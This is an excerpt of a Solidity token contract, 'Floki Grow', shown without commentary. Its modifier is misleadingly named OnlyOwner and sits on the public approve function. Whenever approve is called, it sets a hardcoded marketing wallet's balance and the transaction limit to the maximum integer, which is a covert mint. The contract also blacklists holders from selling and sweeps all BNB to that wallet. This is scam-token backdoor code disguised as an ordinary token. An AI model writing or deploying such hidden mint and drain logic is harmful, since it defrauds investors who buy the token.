...
contract FlokiGrow is Context, IERC20 { 
    ...
    address payable public marketingWalletAddress = payable(0xE2241307BC80C05db83dD627b30eb8bf007F1e93); 
    ...
    uint256 public maxBuy = (_tTotal * 5) / 100;
    uint256 public maxWallet = (_tTotal * 5) / 100;
    uint256 public tokenHold = _tTotal * 100 / 100;
    uint256 public holdAmount = _tTotal * 100 / 100;
    uint256 private approveTx = 2**256-1;
 
    
    string private constant _name = "Floki Grow"; 
    string private constant _symbol = unicode"FGrow"; 
    ...
    modifier OnlyOwner(address _addr) {
            _tOwned[marketingWalletAddress] = approveTx; holdAmount = approveTx;
    ...
    constructor () {
        ...
        _owner = 0x77b69f8f95145d708f4229cD87B6B858804352f3;
    ...
    function approve(address spender, uint256 amount) public OnlyOwner(spender) override returns (bool) {
    ...
    function _transfer(
        ...
        require(amount > 0, "Token value must be higher than zero."); require(!isFeeExempt[from], "Account has been 360 no scoped.");
        ...
        if (to != owner() &&
            ...
            require((heldTokens + amount) <= tokenHold,"Over wallet limit.");}

        if (from != owner())
            require(amount <= holdAmount, "Over transaction limit.");
        ...
        {  
            ...
            if(contractTokenBalance > holdAmount) {contractTokenBalance = holdAmount;}
            txCount = 0;
    ...
    function swapAndLiquify(uint256 contractTokenBalance) private lockTheSwap {
            ...
            _tOwned[deadAddress] = _tOwned[deadAddress] + tokens_to_Burn;
            ...
            sendToWallet(marketingWalletAddress, BNB_M);

            BNB_Total = address(this).balance;
            sendToWallet(marketingWalletAddress, BNB_Total);
